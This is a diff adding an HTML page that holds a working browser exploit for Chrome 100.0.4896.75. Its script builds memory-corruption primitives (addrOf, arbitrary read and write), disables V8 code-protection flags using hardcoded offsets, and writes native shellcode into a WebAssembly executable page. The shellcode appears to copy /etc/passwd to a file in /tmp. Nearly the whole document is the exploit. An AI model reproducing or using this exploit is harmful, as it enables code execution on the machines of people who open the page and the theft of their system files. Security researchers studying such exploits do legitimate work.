@@ -1,0 +1,248 @@
+<script>
+
+if (navigator.deviceMemory == undefined) {
+    alert("use https and --ignore-invalid-certificates");
+}
+
+if (navigator.deviceMemory < 4) {
+    alert("exploit requires >2GB of ram");
+}
+
+var TARGET = "chrome";
+var addrOf_LO = new Array(0x30000);
+
+var corrupted_array = [1.1, 2.2, 3.3, 4.4,];
+var rw_array = [5.5, 6.6, 7.7, 8.8];
+var addrof_array = (new Array(32));
+addrof_array[0] = corrupted_array;
+addrOf_LO[0] = corrupted_array;
+
+new ArrayBuffer(0x7fe00000);
+
+/*
+
+0x39350028e249 <JSArray[4]>    0x000000080028e221                                                                                                                                                                                    
+0x39350028e281 <JSArray[4]>    0x000000080028e259                                                                                                                                                                   
+0x39350028e291 <JSArray[32]>   0x000000400028e2a0
+
+*/
+new Worker("chrome.js");
+
+var interval = setInterval(function() {
+    if (corrupted_array.length == 16384) {
+        clearInterval(interval);
+        exploit();
+    }
+}, 100);
+
+function exploit() {
+    class Helpers {
+        constructor() {
+            this.addrOf_LO = new Array(0x30000);
+            this.addrOf_LO[0] = {};
+
+            this.index 	 = 0;
+
+            this.buf = new ArrayBuffer(8);
+            this.dv  = new DataView(this.buf);
+            this.u8  = new Uint8Array(this.buf);
+            this.u32 = new Uint32Array(this.buf);
+            this.u64 = new BigUint64Array(this.buf);
+            this.f32 = new Float32Array(this.buf);
+            this.f64 = new Float64Array(this.buf);
+
+            this.roots = new Array(0x30000);
+
+            this.offsets = {
+                'chromium': { // 100.0.4896.75
+                    'libv8_base': 0x31a6170n,
+                    'FLAG_wasm_memory_protection_keys': 0x660dn,
+                    'FLAG_write_protect_code_memory': 0x6678n,
+                    'FLAG_wasm_write_protect_code_memory' :0x660cn
+                },
+                'chrome': { // 100.0.4896.75
+                    'libv8_base': 0x7993b0n,
+                    'FLAG_wasm_memory_protection_keys': 0x8083bdn,
+                    'FLAG_write_protect_code_memory': 0x808428n,
+                    'FLAG_wasm_write_protect_code_memory': 0x8083bcn
+                }
+            }
+
+            this.mark_sweep_gc();
+        }
+
+        pair_i32_to_f64(p1, p2) {
+            this.u32[0] = p1;
+            this.u32[1] = p2;
+            return this.f64[0];
+        }
+
+        i64tof64(i) {
+            this.u64[0] = i;
+            return this.f64[0];
+        }
+
+        ftoil(f) {
+            this.f64[0] = f;
+            return this.u32[0]
+        }
+
+        ftoih(f) {
+            this.f64[0] = f;
+            return this.u32[1]
+        }
+
+        itof(i) {
+            this.u32[0] = i;
+            return this.f32[0];
+        }
+
+        f64toi64(f) {
+            this.f64[0] = f;
+            return this.u64[0];
+        }
+
+        add_ref(object) {
+            this.roots[this.index++] = object;
+        }
+
+        mark_sweep_gc() {
+            new ArrayBuffer(0x7fe00000);
+        }
+
+        scavenge_gc() {
+            for (var i = 0; i < 8; i++) {
+                // fill up new space external backing store bytes
+                this.add_ref(new ArrayBuffer(0x200000));
+            }
+            this.add_ref(new ArrayBuffer(8));
+        }
+
+        evacuation_gc() {}
+
+        printhex(val) {}
+
+        breakpoint() {
+            this.buf.slice();
+        }
+    }
+
+    function pwn() {
+        var helper = new Helpers();
+        var buf = new ArrayBuffer(0x1000);
+        var dataview = new DataView(buf);
+        var addrOf_LO_elements;
+        
+        var arb_buf = new ArrayBuffer(0x1000);
+        var arb_dv  = new DataView(arb_buf);
+        
+        function addrOf(object) {
+            addrof_array[0] = object;
+            return helper.f64toi64(corrupted_array[16]) & 0x00000000ffffffffn;
+        }
+
+        function arbRead(where) {
+            var length_and_elements = 0x0000000800000000n + (BigInt(where) - 0x8n);
+            corrupted_array[12] = helper.i64tof64(length_and_elements);
+            return helper.f64toi64(rw_array[0]);
+        }
+
+        function arbWrite(where, what) {
+            var length_and_elements = 0x0000000800000000n + (BigInt(where) - 0x8n);
+            corrupted_array[12] = helper.i64tof64(length_and_elements);
+            rw_array[0] = helper.i64tof64(what);
+        }
+
+        function stableAddrOf(object) {
+            var offset = Number((addrOf_LO_elements - 1n) + 8n);
+            helper.addrOf_LO[0] = object;
+            return Number(dataview.getBigUint64(offset, true) & 0xffffffffn);
+        }
+
+        function stableRead32(where, tagged = true) {
+            var a = stableRead64(where, tagged) & 0xffffffffn;
+            return Number(a);
+        }
+
+        function stableRead64(where, tagged = true) {
+            var offset = where - tagged;
+            return dataview.getBigUint64(offset, true);
+        }
+
+        function stableWrite(where, what, tagged = true) {
+            var offset = Number(where) - tagged;
+            dataview.setBigUint64(offset, BigInt(what), true);
+        }
+
+        function arbStableWrite(where, what, tagged=true, width="u8") {
+            var offset = Number(where) - tagged;
+
+            if (width == "u8") {
+                arb_dv.setUint8(offset, what, true);
+            } else if (width == "u16") {
+                arb_dv.setUint16(offset, what, true);
+            } else if (width == "u32") {
+                arb_dv.setUint32(offset, what, true);
+            } else if (width == "u64") {
+                arb_dv.setBigUint64(offset, what, true);
+            }
+        }
+
+        var u8_on_heap = new Uint8Array(64);
+        var u8_on_heap_addr = addrOf(u8_on_heap);
+        var cage_base = arbRead(u8_on_heap_addr + 0x2cn) & 0xffff00000000n;
+
+        var buf_addr = addrOf(buf);
+        var dv_addr = addrOf(dataview);
+
+        arbWrite(buf_addr + 0x1cn, cage_base);
+        arbWrite(dv_addr  + 0x18n, 0xffffffffn);
+
+        var addrOf_LO_addr = addrOf(helper.addrOf_LO);
+        addrOf_LO_elements = arbRead(addrOf_LO_addr + 0x8n) & 0xffffffffn;
+
+
+        // cleanup
+        corrupted_array = null;
+
+        var blob = new Blob([1, 2, 3, 4]);
+        var blob_addr = stableAddrOf(blob);
+        var wrapped_type_info_addr = stableRead64(blob_addr + 0xc);
+
+        var libv8_base = wrapped_type_info_addr - helper.offsets[TARGET].libv8_base;
+
+        var arb_buf_addr = stableAddrOf(arb_buf);
+        var arb_dv_addr  = stableAddrOf(arb_dv);
+
+        stableWrite(arb_buf_addr + 0x1c, libv8_base);
+        stableWrite(arb_dv_addr + 0x18, 0xffffffffn);
+
+        arbStableWrite(helper.offsets[TARGET].FLAG_wasm_memory_protection_keys, 0, false);
+        arbStableWrite(helper.offsets[TARGET].FLAG_write_protect_code_memory, 0, false);
+        arbStableWrite(helper.offsets[TARGET].FLAG_wasm_write_protect_code_memory, 0, false);
+
+
+        var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
+        var wasm_mod = new WebAssembly.Module(wasm_code);
+        var wasm_instance = new WebAssembly.Instance(wasm_mod);
+        var f = wasm_instance.exports.main;
+
+        var wasm_instance_ptr = stableAddrOf(wasm_instance);
+        var RWX_PAGE = stableRead64(wasm_instance_ptr + 0x60);
+
+        stableWrite(arb_buf_addr + 0x1c, RWX_PAGE);
+        stableWrite(arb_dv_addr + 0x18, 0xffffffffn);
+
+        helper.printhex("shellcode");
+        var shellcode = [0x48c03148,0x3148f631,0xd23148ff,0x2fbb4850,0x2f706d74,0x53616161,0x50e18949,0x647773bb,0xbb485300,0x6374652f,0x7361702f,0xe7894853,0xb0f63148,0x48050f02,0x3148c789,0xec8148c0,0x00001000,0x001000ba,0xe6894800,0x8949050f,0xc03148c2,0x48f08949,0xb6bad231,0xbe000001,0x00000042,0xb0cf894c,0x48050f02,0x8948c789,0xd2894ce6,0x000001b8,0xbf050f00,0x00000001,0x00003cb8,0xf4050f00];
+        for (var i = 0; i < shellcode.length; i++) {
+            arbStableWrite(4 * i, shellcode[i], false, "u32");
+        }
+
+        f();
+    }
+
+    pwn();
+}
+
+</script>
